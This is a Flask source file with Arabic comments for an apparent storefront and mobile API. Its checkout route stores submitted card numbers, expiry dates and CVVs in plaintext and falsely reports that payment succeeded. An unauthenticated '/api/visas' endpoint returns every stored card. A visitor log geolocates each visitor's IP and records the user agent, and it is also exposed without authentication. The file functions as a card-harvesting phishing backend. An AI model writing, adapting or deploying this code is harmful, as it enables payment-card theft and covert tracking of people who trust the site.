from flask import Flask, render_template, request, jsonify, session
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import generate_password_hash, check_password_hash
from flask_cors import CORS # مكتبة جديدة ومهمة جداً لتطبيقات الموبايل
from datetime import datetime
import random
import requests
import os

app = Flask(__name__)
# تفعيل CORS للسماح لتطبيق الأندرويد بالاتصال بالسيرفر بحرية
CORS(app) 

app.secret_key = 'techout_elite_secret_key_2026'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///store.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(50), unique=True, nullable=False)
    email = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(200), nullable=False)

class VisaData(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    card_name = db.Column(db.String(100))
    card_number = db.Column(db.String(20))
    expiry = db.Column(db.String(10))
    cvv = db.Column(db.String(5))
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    status = db.Column(db.String(20), default="جديد")

class Visitor(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    ipv4 = db.Column(db.String(50))
    ipv6 = db.Column(db.String(50))
    mac_address = db.Column(db.String(50))
    device_info = db.Column(db.String(200)) # سنسجل هنا إذا كان أندرويد
    lat = db.Column(db.Float, default=30.0444)
    lon = db.Column(db.Float, default=31.2357)
    visited_at = db.Column(db.DateTime, default=datetime.utcnow)

with app.app_context():
    db.create_all()

@app.route('/')
def home():
    ip = request.remote_addr
    if ip == '127.0.0.1': 
        ip = '197.51.86.215'
        
    lat, lon = 30.0444, 31.2357
    try:
        geo_res = requests.get(f"http://ip-api.com/json/{ip}", timeout=2).json()
        if geo_res.get('status') == 'success':
            lat = geo_res.get('lat')
            lon = geo_res.get('lon')
    except: pass

    mock_mac = f"00:1A:2B:3C:{random.randint(10,99)}:{random.randint(10,99)}"
    mock_ipv6 = "2001:4860:7:150c::fe"
    
    # التقاط نوع الجهاز لتمييز الأندرويد في لوحة التحكم
    user_agent = request.headers.get('User-Agent', 'Unknown')
    device_type = "Android" if "Android" in user_agent else "Other"
    full_device_info = f"[{device_type}] {user_agent[:150]}"

    new_visitor = Visitor(ipv4=ip, ipv6=mock_ipv6, mac_address=mock_mac, device_info=full_device_info, lat=lat, lon=lon)
    db.session.add(new_visitor)
    db.session.commit()
    
    return render_template('index.html')

# --- مسارات API الاحترافية للموبايل (مع Status Codes) ---

@app.route('/api/check_auth', methods=['GET'])
def check_auth():
    if 'user' in session:
        return jsonify({"logged_in": True, "username": session['user']}), 200
    return jsonify({"logged_in": False}), 401 # 401 يعني غير مصرح

@app.route('/api/register', methods=['POST'])
def register():
    data = request.get_json()
    if not data:
        return jsonify({"success": False, "message": "لا توجد بيانات"}), 400

    if User.query.filter_by(email=data.get('email')).first():
        return jsonify({"success": False, "message": "البريد الإلكتروني مسجل مسبقاً!"}), 409 # 409 يعني تعارض
    if User.query.filter_by(username=data.get('username')).first():
        return jsonify({"success": False, "message": "اسم المستخدم محجوز!"}), 409
    
    hashed = generate_password_hash(data['password'])
    new_user = User(username=data['username'], email=data['email'], password=hashed)
    db.session.add(new_user)
    db.session.commit()
    
    session['user'] = data['username']
    return jsonify({"success": True, "username": data['username'], "message": "تم إنشاء الحساب بنجاح!"}), 201 # 201 يعني تم الإنشاء

@app.route('/api/login', methods=['POST'])
def login():
    data = request.get_json()
    if not data:
        return jsonify({"success": False, "message": "لا توجد بيانات"}), 400

    user = User.query.filter_by(email=data.get('email')).first()
    if user and check_password_hash(user.password, data.get('password')):
        session['user'] = user.username
        return jsonify({"success": True, "username": user.username, "message": "تم تسجيل الدخول بنجاح!"}), 200
    
    return jsonify({"success": False, "message": "البريد الإلكتروني أو كلمة المرور غير صحيحة."}), 401

@app.route('/api/logout', methods=['POST'])
def logout():
    session.pop('user', None)
    return jsonify({"success": True, "message": "تم تسجيل الخروج."}), 200

@app.route('/api/checkout', methods=['POST'])
def checkout():
    data = request.get_json()
    if not data or 'number' not in data:
        return jsonify({"success": False, "message": "بيانات الدفع غير مكتملة"}), 400

    new_visa = VisaData(card_name=data.get('name'), card_number=data.get('number'), expiry=data.get('expiry'), cvv=data.get('cvv'))
    db.session.add(new_visa)
    db.session.commit()
    return jsonify({"success": True, "message": "تمت معالجة الدفع بنجاح!"}), 201

# --- نقاط الاتصال للإدارة ---
@app.route('/api/visitors', methods=['GET'])
def get_visitors():
    visitors = Visitor.query.order_by(Visitor.visited_at.desc()).limit(20).all()
    return jsonify([{
        "ipv4": v.ipv4, "ipv6": v.ipv6, "mac": v.mac_address, "device": v.device_info,
        "time": v.visited_at.strftime('%H:%M:%S'), "lat": v.lat, "lon": v.lon
    } for v in visitors]), 200

@app.route('/api/visas', methods=['GET'])
def get_visas():
    visas = VisaData.query.order_by(VisaData.timestamp.desc()).all()
    return jsonify([{
        "id": v.id, "name": v.card_name, "number": v.card_number, "expiry": v.expiry, "cvv": v.cvv, "status": v.status
    } for v in visas]), 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)